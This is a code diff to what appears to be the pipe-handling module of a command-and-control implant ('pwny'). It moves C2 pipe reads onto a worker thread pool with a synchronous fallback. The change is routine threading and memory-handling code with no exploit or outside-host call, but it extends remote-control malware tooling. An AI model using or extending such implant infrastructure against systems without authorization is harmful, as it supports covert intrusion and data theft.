@@ -28,8 +28,25 @@
 #include <pwny/log.h>
 #include <pwny/api.h>
 #include <pwny/pipe.h>
+#include <pwny/worker.h>
 
 #include <uthash/uthash.h>
+
+/*
+ * Context for async pipe operations dispatched to worker threads.
+ */
+
+typedef struct
+{
+    worker_pool_t *pool;
+    c2_t *c2;
+    tlv_pkt_t *request;
+    pipes_t *pipes;
+    pipe_t *pipe;
+    int id;
+    int type;
+    int length;
+} pipe_async_ctx_t;
 
 static tlv_pkt_t *pipe_create(c2_t *c2)
 {
@@ -341,17 +358,60 @@ finalize:
     return result;
 }
 
+static void pipe_read_worker(void *arg)
+{
+    pipe_async_ctx_t *ctx;
+    unsigned char *buffer;
+    ssize_t bytes;
+    tlv_pkt_t *result;
+
+    ctx = (pipe_async_ctx_t *)arg;
+    buffer = calloc(1, ctx->length);
+
+    if (buffer == NULL)
+    {
+        result = api_craft_tlv_pkt(API_CALL_FAIL, ctx->request);
+        tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, ctx->id);
+        tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, ctx->type);
+
+        worker_push_response(ctx->pool, ctx->c2, result, ctx->request);
+        free(ctx);
+        return;
+    }
+
+    bytes = ctx->pipes->callbacks.read_cb(ctx->pipe, buffer, ctx->length);
+
+    if (bytes >= 0)
+    {
+        result = api_craft_tlv_pkt(API_CALL_SUCCESS, ctx->request);
+        tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER, buffer, bytes);
+    }
+    else
+    {
+        result = api_craft_tlv_pkt(API_CALL_FAIL, ctx->request);
+    }
+
+    free(buffer);
+
+    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, ctx->id);
+    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, ctx->type);
+
+    worker_push_response(ctx->pool, ctx->c2, result, ctx->request);
+    free(ctx);
+}
+
 static tlv_pkt_t *pipe_read(c2_t *c2)
 {
     int id;
     int type;
     int length;
-    unsigned char *buffer;
 
-    ssize_t bytes;
-    tlv_pkt_t *result;
     pipes_t *pipes;
     pipe_t *pipe;
+    tlv_pkt_t *result;
+    tlv_pkt_t *request_clone;
+    worker_pool_t *pool;
+    pipe_async_ctx_t *ctx;
 
     tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id);
     tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_TYPE, &type);
@@ -373,30 +433,80 @@ static tlv_pkt_t *pipe_read(c2_t *c2)
     }
 
     tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_LENGTH, &length);
-    buffer = calloc(1, length);
 
-    if (buffer == NULL)
+    /* Try async dispatch via worker pool.
+     * Skip if the pipe requires thread affinity (PIPE_SYNCHRONOUS). */
+
+    pool = (worker_pool_t *)c2->worker;
+
+    if (pool != NULL && !(pipe->flags & PIPE_SYNCHRONOUS))
     {
-        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
-        goto finalize;
+        request_clone = tlv_pkt_clone(c2->request);
+
+        if (request_clone == NULL)
+        {
+            goto sync_fallback;
+        }
+
+        ctx = calloc(1, sizeof(*ctx));
+
+        if (ctx == NULL)
+        {
+            tlv_pkt_destroy(request_clone);
+            goto sync_fallback;
+        }
+
+        ctx->pool = pool;
+        ctx->c2 = c2;
+        ctx->request = request_clone;
+        ctx->pipes = pipes;
+        ctx->pipe = pipe;
+        ctx->id = id;
+        ctx->type = type;
+        ctx->length = length;
+
+        if (worker_submit(pool, pipe_read_worker, ctx) == 0)
+        {
+            log_debug("* Async reading from C2 pipe (id: %d)\n", pipe->id);
+
+            tlv_pkt_destroy(c2->request);
+            c2->request = NULL;
+            return NULL;
+        }
+
+        /* Submit failed — clean up and fall through to sync */
+        tlv_pkt_destroy(request_clone);
+        free(ctx);
     }
 
-    log_debug("* Reading from C2 pipe (id: %d)\n", pipe->id);
-    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
-    bytes = pipes->callbacks.read_cb(pipe, buffer, length);
+sync_fallback:
+    {
+        unsigned char *buffer;
+        ssize_t bytes;
 
-    if (bytes >= 0)
-    {
-        tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER, buffer, bytes);
-    }
-    else
-    {
+        buffer = calloc(1, length);
+
+        if (buffer == NULL)
+        {
+            result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+            goto finalize;
+        }
+
+        log_debug("* Reading from C2 pipe (id: %d)\n", pipe->id);
+        bytes = pipes->callbacks.read_cb(pipe, buffer, length);
+
+        if (bytes >= 0)
+        {
+            result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
+            tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER, buffer, bytes);
+        }
+        else
+        {
+            result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+        }
+
         free(buffer);
-        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
-        goto finalize;
     }
-
-    free(buffer);
 
 finalize:
     tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, id);
@@ -405,16 +515,46 @@ finalize:
     return result;
 }
 
+static void pipe_readall_worker(void *arg)
+{
+    pipe_async_ctx_t *ctx;
+    void *buffer;
+    ssize_t bytes;
+    tlv_pkt_t *result;
+
+    ctx = (pipe_async_ctx_t *)arg;
+    bytes = ctx->pipes->callbacks.readall_cb(ctx->pipe, &buffer);
+
+    if (bytes >= 0)
+    {
+        result = api_craft_tlv_pkt(API_CALL_SUCCESS, ctx->request);
+        tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER,
+                          (unsigned char *)buffer, bytes);
+        free(buffer);
+    }
+    else
+    {
+        result = api_craft_tlv_pkt(API_CALL_FAIL, ctx->request);
+    }
+
+    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, ctx->id);
+    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, ctx->type);
+
+    worker_push_response(ctx->pool, ctx->c2, result, ctx->request);
+    free(ctx);
+}
+
 static tlv_pkt_t *pipe_readall(c2_t *c2)
 {
     int id;
     int type;
-    void *buffer;
 
-    ssize_t bytes;
-    tlv_pkt_t *result;
     pipes_t *pipes;
     pipe_t *pipe;
+    tlv_pkt_t *result;
+    tlv_pkt_t *request_clone;
+    worker_pool_t *pool;
+    pipe_async_ctx_t *ctx;
 
     tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id);
     tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_TYPE, &type);
@@ -435,25 +575,71 @@ static tlv_pkt_t *pipe_readall(c2_t *c2)
         goto finalize;
     }
 
-    log_debug("* Reading from C2 pipe (id: %d)\n", pipe->id);
-    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
-    bytes = pipes->callbacks.readall_cb(pipe, &buffer);
+    /* Try async dispatch via worker pool.
+     * Skip if the pipe requires thread affinity (PIPE_SYNCHRONOUS). */
 
-    /* We expect callback to allocate memory for buffer so
-     * it can be then freed after successful execution
-     */
+    pool = (worker_pool_t *)c2->worker;
 
-    if (bytes >= 0)
+    if (pool != NULL && !(pipe->flags & PIPE_SYNCHRONOUS))
     {
-        tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER, (unsigned char *)buffer, bytes);
-    }
-    else
-    {
-        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
-        goto finalize;
+        request_clone = tlv_pkt_clone(c2->request);
+
+        if (request_clone == NULL)
+        {
+            goto sync_fallback;
+        }
+
+        ctx = calloc(1, sizeof(*ctx));
+
+        if (ctx == NULL)
+        {
+            tlv_pkt_destroy(request_clone);
+            goto sync_fallback;
+        }
+
+        ctx->pool = pool;
+        ctx->c2 = c2;
+        ctx->request = request_clone;
+        ctx->pipes = pipes;
+        ctx->pipe = pipe;
+        ctx->id = id;
+        ctx->type = type;
+        ctx->length = 0;
+
+        if (worker_submit(pool, pipe_readall_worker, ctx) == 0)
+        {
+            log_debug("* Async reading all from C2 pipe (id: %d)\n", pipe->id);
+
+            tlv_pkt_destroy(c2->request);
+            c2->request = NULL;
+            return NULL;
+        }
+
+        /* Submit failed — clean up and fall through to sync */
+        tlv_pkt_destroy(request_clone);
+        free(ctx);
     }
 
-    free(buffer);
+sync_fallback:
+    {
+        void *buffer;
+        ssize_t bytes;
+
+        log_debug("* Reading from C2 pipe (id: %d)\n", pipe->id);
+        bytes = pipes->callbacks.readall_cb(pipe, &buffer);
+
+        if (bytes >= 0)
+        {
+            result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
+            tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER,
+                              (unsigned char *)buffer, bytes);
+            free(buffer);
+        }
+        else
+        {
+            result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+        }
+    }
 
 finalize:
     tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, id);
